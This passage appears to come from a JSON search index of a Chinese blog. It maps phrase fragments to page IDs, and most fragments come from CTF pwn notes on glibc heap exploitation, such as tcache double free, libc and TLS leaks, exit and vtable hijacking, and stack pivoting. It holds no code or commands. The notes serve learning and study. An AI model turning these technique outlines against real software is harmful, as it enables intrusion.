\"181\":1,\"282\":1},\"1\":{\"151\":1,\"152\":1,\"153\":1}}],[\"填写binsh只是为了后续调用system函数的时候可以找个地址来当作参数\",{\"1\":{\"165\":1,\"287\":1}}],[\"导致tcache\",{\"1\":{\"165\":1,\"287\":1}}],[\"导致我反复失败\",{\"1\":{\"165\":1,\"287\":1}}],[\"导致我们的复现失败\",{\"1\":{\"41\":1}}],[\"绕过也很简单泄露heap地址即可\",{\"1\":{\"164\":1,\"286\":1}}],[\"绕过检查\",{\"1\":{\"130\":1}}],[\"^我想要构造的fd\",{\"1\":{\"276\":1}}],[\"^=\",{\"1\":{\"244\":1,\"246\":1,\"247\":1}}],[\"^exit\",{\"1\":{\"165\":1,\"287\":1}}],[\"^\",{\"1\":{\"163\":2,\"247\":1,\"285\":2,\"288\":1}}],[\"才看见代码\",{\"1\":{\"248\":1}}],[\"才是合法的fd才能够被正常解析\",{\"1\":{\"163\":1,\"285\":1}}],[\"才会放入fastbin\",{\"1\":{\"70\":1}}],[\"难点\",{\"1\":{\"163\":1,\"165\":1,\"285\":1,\"287\":1}}],[\"剩下0xf3c7d0\",{\"1\":{\"161\":1,\"283\":1}}],[\"彻底消耗topchunk\",{\"1\":{\"161\":1,\"283\":1}}],[\"消耗topchunk到size为一个较小值\",{\"1\":{\"161\":1,\"283\":1}}],[\"消耗topchunk触发fastbin的合并\",{\"1\":{\"157\":1,\"279\":1}}],[\"范围\",{\"1\":{\"161\":1,\"283\":1}}],[\"等信息\",{\"1\":{\"158\":1,\"280\":1}}],[\"等效为\",{\"1\":{\"81\":1,\"268\":1}}],[\"泄露heap\",{\"1\":{\"288\":1}}],[\"泄露heap地址\",{\"1\":{\"168\":1,\"272\":1}}],[\"泄露出标准io地址从而推算出libc地址\",{\"1\":{\"259\":1}}],[\"泄露出chunk\",{\"1\":{\"158\":1,\"280\":1,\"288\":1}}],[\"泄露tls中信息\",{\"1\":{\"163\":1,\"285\":1}}],[\"泄露tls+0x30\",{\"0\":{\"163\":1,\"285\":1}}],[\"泄露libc地址\",{\"1\":{\"146\":1}}],[\"泄露libc\",{\"0\":{\"140\":1,\"158\":1,\"280\":1},\"1\":{\"157\":1,\"279\":1}}],[\"原本会遍历所有的file结构体依次执行overflow函数\",{\"1\":{\"169\":1}}],[\"原创\",{\"1\":{\"157\":1,\"167\":1,\"178\":1,\"182\":1,\"279\":1}}],[\"原理3\",{\"1\":{\"231\":1}}],[\"原理脚本\",{\"0\":{\"182\":1}}],[\"原理细学习\",{\"0\":{\"166\":1}}],[\"原理很简单\",{\"1\":{\"160\":1,\"282\":1}}],[\"原理\",{\"0\":{\"74\":1,\"142\":1},\"1\":{\"231\":1}}],[\"劫持bss段数据\",{\"1\":{\"275\":1}}],[\"劫持head\",{\"0\":{\"275\":1}}],[\"劫持freechunk\",{\"0\":{\"273\":1}}],[\"劫持exit\",{\"0\":{\"165\":1,\"287\":1}}],[\"劫持\",{\"1\":{\"157\":1,\"279\":1}}],[\"改为0x800\",{\"1\":{\"182\":1}}],[\"改写isused和buff指针\",{\"1\":{\"157\":1,\"279\":1}}],[\"改默认启动activity\",{\"1\":{\"36\":1}}],[\"审题\",{\"0\":{\"156\":1,\"278\":1}}],[\"可进行largebin\",{\"1\":{\"168\":1}}],[\"可喜可贺\",{\"1\":{\"153\":1}}],[\"可以直接让一个文件描述符的内容输出到另一个文件描述符上非常适合平替这次的write函数\",{\"1\":{\"268\":1}}],[\"可以直接进入docker内部\",{\"1\":{\"43\":1}}],[\"可以用于查看和编辑文件内容\",{\"1\":{\"249\":1}}],[\"可以向上翻页\",{\"1\":{\"249\":1}}],[\"可以传递\",{\"1\":{\"243\":1}}],[\"可以查看当前libc和ld的版本\",{\"1\":{\"240\":1}}],[\"可以得到libc\",{\"1\":{\"240\":1}}],[\"可以粗俗得当作一个属于\",{\"1\":{\"236\":1}}],[\"可以发现和我们的fp一模一样\",{\"1\":{\"202\":1}}],[\"可以发现就是塞满了各种函数\",{\"1\":{\"199\":1}}],[\"可以发现\",{\"1\":{\"173\":1,\"202\":1,\"216\":1}}],[\"可以发现fd\",{\"1\":{\"96\":1}}],[\"可以实现任意free\",{\"1\":{\"165\":1,\"287\":1}}],[\"可以快速定位到合适大小的空闲chunk\",{\"1\":{\"132\":1}}],[\"可以通过use\",{\"1\":{\"69\":1}}],[\"可以构造多个同名字的函数\",{\"1\":{\"19\":1}}],[\"可以列出来\",{\"1\":{\"5\":1}}],[\"刚好四字节\",{\"1\":{\"267\":1}}],[\"刚好对上一个chunk\",{\"1\":{\"153\":1}}],[\"刚好0x8的空间\",{\"1\":{\"115\":1}}],[\"合适查看大文件\",{\"1\":{\"249\":1}}],[\"合法的chunk\",{\"1\":{\"150\":1,\"154\":1}}],[\"合并chunk\",{\"1\":{\"273\":1}}],[\"合并后\",{\"1\":{\"161\":1,\"283\":1}}],[\"合并后会被放入unsorted\",{\"1\":{\"69\":1}}],[\"合并之前\",{\"1\":{\"161\":1,\"283\":1}}],[\"合并机制来修改\",{\"1\":{\"152\":1}}],[\"合并\",{\"1\":{\"150\":1}}],[\"合并时对prev\",{\"1\":{\"88\":1}}],[\"高版本的overlapping\",{\"0\":{\"146\":1}}],[\"悲\",{\"1\":{\"145\":1}}],[\"或\",{\"1\":{\"249\":16}}],[\"或main\",{\"1\":{\"142\":1}}],[\"或者文件名为\",{\"1\":{\"249\":1}}],[\"或者通过向scanf输入大量数据触发fastbin合并\",{\"1\":{\"157\":1,\"279\":1}}],[\"或者当前chunk的fd是否是bin的头结点\",{\"1\":{\"97\":1}}],[\"或者任何一个我们我们想控制的空间\",{\"1\":{\"91\":1}}],[\"引入了tcache并且没有引入bk随机数安全检查机制\",{\"1\":{\"142\":1}}],[\"题目中存在off\",{\"1\":{\"146\":1}}],[\"题目\",{\"0\":{\"141\":1}}],[\"虽然这个思路失败了\",{\"1\":{\"140\":1}}],[\"虽然之前也是copy\",{\"1\":{\"115\":1}}],[\"什么都pwn只会害了你\",{\"1\":{\"140\":1}}],[\"移动cs寄存器存的数据下\",{\"1\":{\"220\":1}}],[\"移动链表地址\",{\"1\":{\"138\":1}}],[\"移除free\",{\"1\":{\"138\":1}}],[\"å\",{\"1\":{\"138\":1}}],[\"该结构体指定了新线程的属性\",{\"1\":{\"243\":1}}],[\"该函数主要创建\",{\"1\":{\"138\":1}}],[\"该变量保存对应的分配区\",{\"1\":{\"136\":1}}],[\"该地址的相对偏移值存放在libc\",{\"1\":{\"69\":1}}],[\"加0x8是因为这个位置放\",{\"1\":{\"290\":1}}],[\"加载共享库\",{\"1\":{\"239\":1}}],[\"加载到内存后\",{\"1\":{\"23\":1}}],[\"加减偏移\",{\"1\":{\"180\":1}}],[\"加上分配区锁\",{\"1\":{\"138\":1}}],[\"加入malloc\",{\"1\":{\"134\":1}}],[\"关于\",{\"1\":{\"182\":3}}],[\"关于git的规范\",{\"1\":{\"48\":1}}],[\"关联的线程个数\",{\"1\":{\"132\":1}}],[\"空闲\",{\"1\":{\"132\":1}}],[\"空闲链表的状态记录\",{\"1\":{\"132\":1}}],[\"共126个bin\",{\"1\":{\"132\":1}}],[\"共同讨论\",{\"1\":{\"54\":1}}],[\"全局malloc状态管理\",{\"1\":{\"132\":1}}],[\"讲得很清晰\",{\"1\":{\"131\":1}}],[\"推荐这个网站进行查看有哪些函数和传参规范\",{\"1\":{\"268\":1}}],[\"推荐\",{\"1\":{\"131\":1}}],[\"看下面的解释\",{\"1\":{\"276\":1}}],[\"看下一个chunk的prev\",{\"1\":{\"129\":1}}],[\"看一下题发现应该是比较简单的\",{\"1\":{\"254\":1}}],[\"看名字就应该差不多能推断出来是一个线程创建函数\",{\"1\":{\"243\":1}}],[\"看上去应该是简单的hh\",{\"1\":{\"242\":1}}],[\"看雪\",{\"1\":{\"28\":1,\"41\":1,\"157\":1,\"167\":1,\"178\":1,\"182\":1,\"279\":1}}],[\"被free的chunk的上一块chunk是free\",{\"1\":{\"128\":1}}],[\"被释放后\",{\"1\":{\"69\":1}}],[\"其获取逻辑是\",{\"1\":{\"236\":1}}],[\"其他部分还是主要做题遇到再查\",{\"1\":{\"178\":1}}],[\"其中\",{\"1\":{\"173\":1,\"249\":1}}],[\"其中num就是我们malloc传的参数\",{\"1\":{\"74\":1}}],[\"其次tcache的fd指向的是chunk\",{\"1\":{\"127\":1}}],[\"仅高亮显示最后一次搜索匹配的字符串\",{\"1\":{\"249\":1}}],[\"仅仅作为个人回顾使用\",{\"1\":{\"217\":1}}],[\"仅仅是检查bin中第一个chunk是否是相同的chunk\",{\"1\":{\"124\":1}}],[\"仅伪造\",{\"1\":{\"181\":1}}],[\"仅新的commit会被合并\",{\"1\":{\"60\":1}}],[\"记录内容chunk的size\",{\"1\":{\"159\":1,\"281\":1}}],[\"记住是我们想要写入地址\",{\"1\":{\"124\":1}}],[\"记一次patchelf的使用+浅理解ld和libc\",{\"0\":{\"237\":1}}],[\"记一次失败的unsoretedbin\",{\"0\":{\"140\":1}}],[\"记一次高版本glibc\",{\"0\":{\"84\":1}}],[\"记一次删除commit操作\",{\"0\":{\"56\":1}}],[\"利用格式化字符串漏洞就能泄露libc地址\",{\"1\":{\"258\":1}}],[\"利用这里会让字符串地址赋值给rdi\",{\"1\":{\"258\":1}}],[\"利用条件\",{\"0\":{\"207\":1}}],[\"利用\",{\"0\":{\"149\":1}}],[\"利用原理\",{\"0\":{\"148\":1}}],[\"利用double\",{\"1\":{\"124\":1}}],[\"利用tcache泄露地址\",{\"0\":{\"72\":1}}],[\"运行和终止流程\",{\"1\":{\"237\":1}}],[\"运行plt\",{\"1\":{\"234\":2}}],[\"运行\",{\"1\":{\"120\":1,\"121\":1}}],[\"运行images\",{\"1\":{\"43\":1}}],[\"了解\",{\"0\":{\"117\":1}}],[\"否则\",{\"1\":{\"288\":1}}],[\"否则通过next遍历链表查看有未加锁分配区\",{\"1\":{\"134\":1}}],[\"否则将合并后的放入对应bin\",{\"1\":{\"115\":1}}],[\"否则进行遍历判断\",{\"1\":{\"104\":1}}],[\"申请回来\",{\"1\":{\"158\":1,\"280\":1}}],[\"申请\",{\"1\":{\"115\":1}}],[\"申请内存\",{\"1\":{\"115\":1}}],[\"申请内存<64bytes\",{\"1\":{\"115\":1}}],[\"申请内存的过程\",{\"0\":{\"115\":1}}],[\"申请小的内存空间\",{\"1\":{\"112\":1}}],[\"含amp\",{\"1\":{\"114\":1}}],[\"含卸载方法\",{\"1\":{\"47\":1}}],[\"完整的chunk\",{\"1\":{\"114\":1}}],[\"完成类似于初始化的操作比如现在我有类student那么我在student\",{\"1\":{\"20\":1}}],[\"子线程只能用mmap函数\",{\"1\":{\"112\":1}}],[\"向上\",{\"1\":{\"249\":1}}],[\"向上搜索字符串\",{\"1\":{\"249\":1}}],[\"向上滚动一页\",{\"1\":{\"249\":1}}],[\"向上申请内存\",{\"1\":{\"112\":1}}],[\"向下\",{\"1\":{\"249\":1}}],[\"向下搜索字符串\",{\"1\":{\"249\":1}}],[\"向下滚动一页\",{\"1\":{\"249\":1}}],[\"向下翻页\",{\"1\":{\"249\":1}}],[\"向top\",{\"1\":{\"115\":1}}],[\"向docker内部传文件\",{\"1\":{\"43\":1}}],[\"堆地址>>12然后\",{\"1\":{\"276\":1}}],[\"堆管理器用brk或者mmap函数去获取内存\",{\"1\":{\"113\":1}}],[\"堆管理器\",{\"0\":{\"112\":1},\"1\":{\"112\":1}}],[\"堆特性\",{\"1\":{\"111\":1}}],[\"堆结构学习\",{\"1\":{\"111\":1}}],[\"堆结构\",{\"1\":{\"72\":1}}],[\"学pwn日记\",{\"1\":{\"111\":1}}],[\"学习路线\",{\"0\":{\"83\":1},\"1\":{\"83\":1}}],[\"学习文章\",{\"0\":{\"36\":1},\"1\":{\"28\":1,\"57\":1,\"70\":1,\"80\":1,\"178\":1,\"221\":1}}],[\"学习经验\",{\"1\":{\"24\":1}}],[\"做hgame的时候\",{\"1\":{\"111\":1}}],[\"比如对scanf等函数进行操作\",{\"1\":{\"214\":1}}],[\"比如现在fastbin\",{\"1\":{\"124\":1}}],[\"比如0x1003就是取fs的值\",{\"1\":{\"118\":1}}],[\"比如\",{\"1\":{\"110\":1,\"173\":1,\"241\":1}}],[\"危险的地方在于\",{\"1\":{\"110\":1}}],[\"正式做题\",{\"0\":{\"244\":1}}],[\"正式入链\",{\"1\":{\"109\":1}}],[\"正常设置size\",{\"1\":{\"109\":1}}],[\"正在使用中\",{\"1\":{\"132\":1}}],[\"正在使用\",{\"1\":{\"97\":1}}],[\"属性分别对应\",{\"1\":{\"156\":1,\"278\":1}}],[\"属性定义了我们的一些系统行为\",{\"1\":{\"39\":1}}],[\"属于largebin大小则设置fd\",{\"1\":{\"109\":1}}],[\"算出libc\",{\"1\":{\"260\":1}}],[\"算出下一个chunk的size\",{\"1\":{\"109\":1}}],[\"算一下偏差就可以了\",{\"1\":{\"259\":1}}],[\"算是一个正式的攻击手段\",{\"1\":{\"124\":1}}],[\"算剩余的remainder\",{\"1\":{\"106\":1}}],[\"清空要free的chunk\",{\"1\":{\"109\":1}}],[\"清空chunk中除了prev\",{\"1\":{\"109\":1}}],[\"塞入unsortedbin中\",{\"1\":{\"109\":1}}],[\"且不为top\",{\"1\":{\"109\":1}}],[\"且不是mmap分配的\",{\"1\":{\"109\":1}}],[\"且tcache未满则将chunk放入tcache中\",{\"1\":{\"100\":1}}],[\"字段\",{\"1\":{\"109\":1}}],[\"字段名和函数名相同需要加下划线\",{\"1\":{\"21\":1}}],[\"插入到\",{\"1\":{\"109\":1}}],[\"得小于该区域分配的最大size\",{\"1\":{\"109\":1}}],[\"得大于chunk最小值\",{\"1\":{\"109\":1}}],[\"要free的是\",{\"1\":{\"276\":1}}],[\"要实现tcache满\",{\"1\":{\"273\":1}}],[\"要等待的线程标识符\",{\"1\":{\"243\":1}}],[\"要大于minsize\",{\"1\":{\"109\":1}}],[\"要hook的函数偏移\",{\"1\":{\"23\":1}}],[\"要hook的函数\",{\"1\":{\"19\":1}}],[\"要hook的代码\",{\"1\":{\"19\":1}}],[\"避免我们修改chunk\",{\"1\":{\"106\":1}}],[\"优先寻找dt\",{\"1\":{\"238\":1}}],[\"优先取\",{\"1\":{\"143\":1}}],[\"优先取第二个\",{\"1\":{\"106\":1}}],[\"优雅的去除这个bug\",{\"1\":{\"57\":1}}],[\"取\",{\"1\":{\"106\":1}}],[\"取得unsorted\",{\"1\":{\"106\":1}}],[\"取首个大于所需的chunk\",{\"1\":{\"106\":1}}],[\"取largebin的最后一个chunk\",{\"1\":{\"106\":1}}],[\"取最小的chunk\",{\"1\":{\"106\":1}}],[\"取消一个future\",{\"1\":{\"65\":1}}],[\"接下来我们需要理解\",{\"1\":{\"231\":1}}],[\"接下来我们需要筛选\",{\"1\":{\"27\":1}}],[\"接下来的代码都是从largebin中获取chunk\",{\"1\":{\"106\":1}}],[\"匹配第一个小于等于\",{\"1\":{\"104\":1}}],[\"判断是否是fastbin范围\",{\"1\":{\"121\":1}}],[\"判断large是否有空闲chunk\",{\"1\":{\"104\":1}}],[\"判断最后的size是否小于0x20\",{\"1\":{\"74\":1}}],[\"由操作系统加载该文件\",{\"1\":{\"239\":1}}],[\"由libc\",{\"1\":{\"112\":1}}],[\"由大到小\",{\"1\":{\"104\":1}}],[\"由于信息都是通过head\",{\"1\":{\"275\":1}}],[\"由于有个gets函数\",{\"1\":{\"254\":1}}],[\"由于这题涉及多线程\",{\"1\":{\"246\":1}}],[\"由于这个是开发知识就不细讲了\",{\"1\":{\"20\":1}}],[\"由于已经对vtable进行了限制\",{\"1\":{\"214\":1}}],[\"由于要泄露tls+0x30处的地址\",{\"1\":{\"163\":1,\"285\":1}}],[\"由于是使用状态所以\",{\"1\":{\"114\":1}}],[\"由于是单链形式\",{\"1\":{\"71\":1}}],[\"由于定位bck是通过victim来确定的\",{\"1\":{\"91\":1}}],[\"由于前段时间做了hgame的week3的一道overlapping\",{\"1\":{\"87\":1}}],[\"由于对glibc高版本的保护不熟悉\",{\"1\":{\"84\":1}}],[\"由于做题的时候老是脑子不够用\",{\"1\":{\"73\":1}}],[\"由于linux中使用free\",{\"1\":{\"69\":1}}],[\"由于我是是第一次的调用\",{\"1\":{\"234\":1}}],[\"由于我们劫持了vtable\",{\"1\":{\"169\":1}}],[\"由于我们最大申请128\",{\"1\":{\"161\":1,\"283\":1}}],[\"由于我们是common\",{\"1\":{\"61\":1}}],[\"由于我的vmware中ubuntu再次崩溃了\",{\"1\":{\"44\":1}}],[\"首个是main\",{\"1\":{\"128\":1}}],[\"首个chunk赋值给fwd\",{\"1\":{\"103\":1}}],[\"首先我们看一下\",{\"1\":{\"153\":1}}],[\"首先libc版本为2\",{\"1\":{\"142\":1}}],[\"首先获取p的size然后去找到下一个chunk\",{\"1\":{\"129\":1}}],[\"首先这是初始状态\",{\"1\":{\"104\":1}}],[\"首先是依靠这个指令来实现把rbp寄存器值变为我们希望的一个地址\",{\"1\":{\"231\":1}}],[\"首先是通过一次largebin劫持\",{\"1\":{\"169\":1}}],[\"首先是在fastbin上构造出两个以上的chunk\",{\"1\":{\"163\":1,\"285\":1}}],[\"首先是判断情况\",{\"1\":{\"106\":1}}],[\"首先是add\",{\"1\":{\"86\":1}}],[\"首先是tcahe是单链表结构\",{\"1\":{\"70\":1}}],[\"首先\",{\"1\":{\"71\":1,\"109\":1}}],[\"首先会被放到\",{\"1\":{\"69\":1}}],[\"入unsortedbin\",{\"1\":{\"106\":1}}],[\"入bin链和chunk\",{\"0\":{\"104\":1}}],[\"入small链表或者large链表的操作\",{\"1\":{\"101\":1}}],[\"入链\",{\"0\":{\"94\":1}}],[\"归类入链操作\",{\"0\":{\"101\":1}}],[\"返回去掉最高位后的字符串\",{\"1\":{\"288\":1}}],[\"返回解析后的函数地址在\",{\"1\":{\"234\":1}}],[\"返回地址\",{\"1\":{\"234\":2}}],[\"返回结果\",{\"1\":{\"137\":1}}],[\"返回被切割后的chunk\",{\"0\":{\"107\":1}}],[\"返回内存指针\",{\"1\":{\"100\":1}}],[\"返回值通常不会马上获取到\",{\"1\":{\"65\":1}}],[\"返回值\",{\"1\":{\"33\":1}}],[\"则自动退出\",{\"1\":{\"249\":1}}],[\"则使用默认属性创建线程\",{\"1\":{\"243\":1}}],[\"则直接使用\",{\"1\":{\"137\":1}}],[\"则直接返回chunk\",{\"1\":{\"100\":1}}],[\"则thread\",{\"1\":{\"136\":1}}],[\"则从unsorted\",{\"1\":{\"115\":1}}],[\"则从tcachebin\",{\"1\":{\"115\":1}}],[\"则继续进行合并\",{\"1\":{\"109\":1}}],[\"则也设置为空闲\",{\"1\":{\"109\":1}}],[\"则将fd\",{\"1\":{\"106\":1}}],[\"则\",{\"1\":{\"106\":1}}],[\"则报错double\",{\"1\":{\"109\":1}}],[\"则报错\",{\"1\":{\"97\":2}}],[\"所有的文件流\",{\"0\":{\"210\":1}}],[\"所需chunk大小在smallbin的范围之内\",{\"1\":{\"98\":1}}],[\"所以构造一个0x1603d00被free的情况\",{\"1\":{\"276\":1}}],[\"所以可以泄露大量信息\",{\"1\":{\"274\":1}}],[\"所以才改后缀为py\",{\"1\":{\"248\":1}}],[\"所以参与下面加密函数的value值为\",{\"1\":{\"246\":1}}],[\"所以参考文章\",{\"1\":{\"47\":1}}],[\"所以说这个变量是开发的时候编译使用\",{\"1\":{\"238\":1}}],[\"所以就重新了解一下patchelf的使用参考文章\",{\"1\":{\"237\":1}}],[\"所以就是将0x7c00往后512b的内容移动到0x90000去\",{\"1\":{\"220\":1}}],[\"所以就是0x7c00移动到0x90000位置去\",{\"1\":{\"220\":1}}],[\"所以总结一下\",{\"1\":{\"236\":1}}],[\"所以got\",{\"1\":{\"234\":1}}],[\"所以当执行完ret后整个程序流程就跑到了read\",{\"1\":{\"231\":1}}],[\"所以当unsortedbin只有一个chunk的时候那么fd和bk都指向了main\",{\"1\":{\"142\":1}}],[\"所以段基址要先左移4位\",{\"1\":{\"220\":1}}],[\"所以mov\",{\"1\":{\"219\":1}}],[\"所以重点分析这里\",{\"1\":{\"210\":1}}],[\"所以此时整条链是\",{\"1\":{\"202\":1}}],[\"所以这里我们是需要构造第二个fake\",{\"1\":{\"231\":1}}],[\"所以这里的设计了一个vtable\",{\"1\":{\"186\":1}}],[\"所以这里\",{\"1\":{\"185\":1}}],[\"所以这里学习docker构造指定版本的libc环境参考文章\",{\"1\":{\"41\":1}}],[\"所以指针本身值可以被修改\",{\"1\":{\"184\":1}}],[\"所以最终调用了\",{\"1\":{\"169\":1}}],[\"所以最小的在链表最后\",{\"1\":{\"104\":1}}],[\"所以需要gdb手动调试计算出偏差\",{\"1\":{\"163\":1,\"285\":1}}],[\"所以为了方便控制\",{\"1\":{\"161\":1,\"283\":1}}],[\"所以尝试其他思路\",{\"1\":{\"143\":1}}],[\"所以来学习一下基本功学习文章\",{\"1\":{\"111\":1}}],[\"所以也就是fwd\",{\"1\":{\"110\":1}}],[\"所以fwd\",{\"1\":{\"110\":2}}],[\"所以\",{\"1\":{\"104\":1,\"114\":1}}],[\"所以bck改为链表最后一位\",{\"1\":{\"104\":1}}],[\"所以largebin的fd和bk和其他的双向链不同我们不能通过从bin一路通过fd返回到large\",{\"1\":{\"93\":1}}],[\"所以进行阅读源码\",{\"1\":{\"93\":1}}],[\"所以一但我们劫持了victim的bk后\",{\"1\":{\"91\":1}}],[\"所以每个元素\",{\"1\":{\"77\":1}}],[\"所以直接使用公式\",{\"1\":{\"74\":1}}],[\"所以结构体属性就是下一个chunk的指针\",{\"1\":{\"71\":1}}],[\"所以在开发者最初设想中\",{\"1\":{\"184\":1}}],[\"所以在这里系统学习一下git的代码提交规范\",{\"1\":{\"48\":1}}],[\"所以在callback函数中我们的操作对象是每一个对象\",{\"1\":{\"21\":1}}],[\"所以转使用docker\",{\"1\":{\"44\":1}}],[\"所以我有点想直接覆盖数据为11\",{\"1\":{\"254\":1}}],[\"所以我就自然想到了这题先利用overlapping\",{\"1\":{\"87\":1}}],[\"所以我就决定自己写一个程序来完成这个工作并且好好理解一下怎么计算的\",{\"1\":{\"73\":1}}],[\"所以我选择自己拿ubuntu16\",{\"1\":{\"47\":1}}],[\"所以我在这里选择的是\",{\"1\":{\"43\":1}}],[\"所以我带上参数\",{\"1\":{\"27\":1}}],[\"所以我们构造size和prev\",{\"1\":{\"276\":1}}],[\"所以我们要构造好这个chunk\",{\"1\":{\"276\":1}}],[\"所以我们要精心构造一个chunk\",{\"1\":{\"146\":1}}],[\"所以我们直接劫持head\",{\"1\":{\"275\":1}}],[\"所以我们直接进行git\",{\"1\":{\"61\":1}}],[\"所以我们只需要把寄存器的值改变就实现了栈迁移\",{\"1\":{\"231\":1}}],[\"所以我们的\",{\"1\":{\"202\":1}}],[\"所以我们的vtable直接填写这三个中任意一个即可\",{\"1\":{\"180\":1}}],[\"所以我们得想办法绕过\",{\"1\":{\"179\":1}}],[\"所以我们得先填充满tcache\",{\"1\":{\"142\":1}}],[\"所以我们下一次double\",{\"1\":{\"165\":1,\"287\":1}}],[\"所以我们double\",{\"1\":{\"163\":1,\"285\":1}}],[\"所以我们选择触发fastbin的合并\",{\"1\":{\"159\":1,\"281\":1}}],[\"所以我们可以将\",{\"1\":{\"180\":1}}],[\"所以我们可以对一个index无限malloc\",{\"1\":{\"156\":1,\"278\":1}}],[\"所以我们可以构造fd为ptr\",{\"1\":{\"130\":1}}],[\"所以我们需要ds的值左移4位当今的64位操作系统是没有这个东西的\",{\"1\":{\"220\":1}}],[\"所以我们需要后续的malloc\",{\"1\":{\"163\":1,\"285\":1}}],[\"所以我们需要构造一个double\",{\"1\":{\"163\":1,\"285\":1}}],[\"所以我们需要一个alloced\",{\"1\":{\"143\":1}}],[\"所以我们需要overload标明参数\",{\"1\":{\"19\":1}}],[\"所以我们一般把tcache填满来绕过\",{\"1\":{\"125\":1}}],[\"所以我们取第二个\",{\"1\":{\"106\":1}}],[\"所以我们为了不额外修改chunk\",{\"1\":{\"104\":1}}],[\"所以我们就在每个加密函数里面打idapython的脚本\",{\"1\":{\"246\":1}}],[\"所以我们就是看是否malloc的大小\",{\"1\":{\"74\":1}}],[\"所以我们就不带这个了\",{\"1\":{\"27\":1}}],[\"所以我们其实可以在callback函数里面用this\",{\"1\":{\"18\":1}}],[\"获得指向内存空间中当前\",{\"1\":{\"97\":1}}],[\"获取一个大chunk装了heap\",{\"1\":{\"276\":1}}],[\"获取一个异常\",{\"1\":{\"65\":1}}],[\"获取数据\",{\"1\":{\"255\":1}}],[\"获取结果\",{\"1\":{\"255\":1}}],[\"获取目前程序的ld和libc的路径信息\",{\"1\":{\"240\":1}}],[\"获取目前加载的class\",{\"1\":{\"30\":1}}],[\"获取linux加载程序的流程\",{\"1\":{\"237\":1}}],[\"获取vtable\",{\"1\":{\"213\":1}}],[\"获取key的值\",{\"1\":{\"165\":1,\"287\":1}}],[\"获取失败的情况\",{\"1\":{\"137\":1}}],[\"获取了chunk2然后此时链表\",{\"1\":{\"124\":1}}],[\"获取对应大小的fastbin然后获取位置\",{\"1\":{\"121\":1}}],[\"获取对应大小的fastbin\",{\"1\":{\"120\":1}}],[\"获取对应fastbin链\",{\"1\":{\"109\":1}}],[\"获取上一个chunk的头指针\",{\"1\":{\"109\":1}}],[\"获取prev\",{\"1\":{\"109\":1}}],[\"获取物理上下一个chunk的大小\",{\"1\":{\"109\":1}}],[\"获取size大小\",{\"1\":{\"109\":1}}],[\"获取fp\",{\"0\":{\"209\":1}}],[\"获取fastbin的位置\",{\"1\":{\"120\":1}}],[\"获取fd与bk\",{\"1\":{\"81\":1}}],[\"获取future的值\",{\"1\":{\"65\":1}}],[\"获取包名\",{\"0\":{\"26\":1}}],[\"获取类的所有方法\",{\"1\":{\"22\":1}}],[\"获取某个重载函数的全部数量\",{\"1\":{\"19\":1}}],[\"获取java类\",{\"1\":{\"17\":1,\"19\":2,\"20\":1,\"21\":1}}],[\"获取指定的java类\",{\"0\":{\"17\":1}}],[\"物理意义上的紧挨着\",{\"1\":{\"97\":1}}],[\"◂\",{\"1\":{\"96\":16,\"255\":2,\"276\":2}}],[\"▸\",{\"1\":{\"96\":34,\"276\":5}}],[\"没调用scanf之前\",{\"1\":{\"216\":1}}],[\"没执行\",{\"1\":{\"188\":2,\"192\":1}}],[\"没锁就能用\",{\"1\":{\"139\":1}}],[\"没有成功则通过arena\",{\"1\":{\"136\":1}}],[\"没很确定是否unsortedbin可不可以指向自己\",{\"1\":{\"95\":1}}],[\"没找到一个对象就会触发这个callback\",{\"1\":{\"21\":1}}],[\"直到其他线程对其进行了回收操作\",{\"1\":{\"243\":1}}],[\"直到碰到unsorted\",{\"1\":{\"95\":1}}],[\"直接返回\",{\"1\":{\"288\":1}}],[\"直接返回smallbin\",{\"0\":{\"98\":1}}],[\"直接double\",{\"1\":{\"259\":1}}],[\"直接就是入链头部没什么好说的\",{\"1\":{\"227\":1}}],[\"直接从文中抠出来的图\",{\"1\":{\"223\":1}}],[\"直接write出size大小的内容\",{\"1\":{\"156\":1,\"278\":1}}],[\"直接free记录信息的chunk和我们的内容体chunk\",{\"1\":{\"156\":1,\"278\":1}}],[\"直接将chunk链接到fwd后面\",{\"1\":{\"104\":1}}],[\"直接提前\",{\"1\":{\"102\":1}}],[\"直接向emo\",{\"1\":{\"78\":1}}],[\"直接apt\",{\"1\":{\"47\":1}}],[\"梦的开始\",{\"0\":{\"95\":1}}],[\"遍历的开始\",{\"0\":{\"95\":1}}],[\"遍历完成后调用oncomplete\",{\"1\":{\"21\":1}}],[\"有一个gift函数\",{\"1\":{\"274\":1}}],[\"有格式化\",{\"1\":{\"261\":1}}],[\"有了这个就阻止了我们double\",{\"1\":{\"157\":1,\"279\":1}}],[\"有点做不动heap的题\",{\"1\":{\"111\":1}}],[\"有错误的地方请大佬指正\",{\"1\":{\"92\":1}}],[\"有大佬已经写好了\",{\"1\":{\"47\":1}}],[\"持续更新\",{\"1\":{\"92\":1}}],[\"即此数组表示的是各种大小内存对应的链表头部\",{\"1\":{\"223\":1}}],[\"即前一个\",{\"1\":{\"97\":1}}],[\"即可完成劫持\",{\"1\":{\"91\":1}}],[\"即使未链接stdin\",{\"1\":{\"43\":1}}],[\"漏洞利用\",{\"0\":{\"110\":1}}],[\"漏洞利用图\",{\"0\":{\"91\":1}}],[\"漏洞学习\",{\"0\":{\"79\":1}}],[\"源码阅读\",{\"1\":{\"183\":1}}],[\"源码分析\",{\"0\":{\"93\":1,\"120\":1},\"1\":{\"92\":1}}],[\"源码级调试glibc\",{\"1\":{\"92\":2}}],[\"源码\",{\"0\":{\"90\":1,\"109\":1,\"192\":1,\"195\":1,\"198\":1,\"201\":1,\"204\":1}}],[\"抛开tcache部分\",{\"1\":{\"89\":1}}],[\"失败原因\",{\"0\":{\"88\":1}}],[\"简化后的流程图就是\",{\"1\":{\"87\":1}}],[\"简单的堆题\",{\"1\":{\"259\":1}}],[\"简单栈迁移\",{\"0\":{\"228\":1}}],[\"简单地通过让chunk进入tcache中\",{\"1\":{\"158\":1,\"280\":1}}],[\"简单来说就是遍历整个分配区表判断是否有锁\",{\"1\":{\"139\":1}}],[\"简单来说就是设置删除检查三步走\",{\"1\":{\"65\":1}}],[\"简单总结就是如果我fork了一个分支\",{\"1\":{\"60\":1}}],[\"再占满tcache\",{\"1\":{\"276\":1}}],[\"再利用leave\",{\"1\":{\"230\":1}}],[\"再利用分割机制就可以泄露libc\",{\"1\":{\"87\":1}}],[\"再通过分割机制\",{\"1\":{\"157\":1,\"279\":1}}],[\"再申请回来\",{\"1\":{\"157\":1,\"279\":1}}],[\"再去查找libc的基地址\",{\"1\":{\"72\":1}}],[\"最开始的两行代码\",{\"0\":{\"218\":1}}],[\"最终调用open\",{\"1\":{\"205\":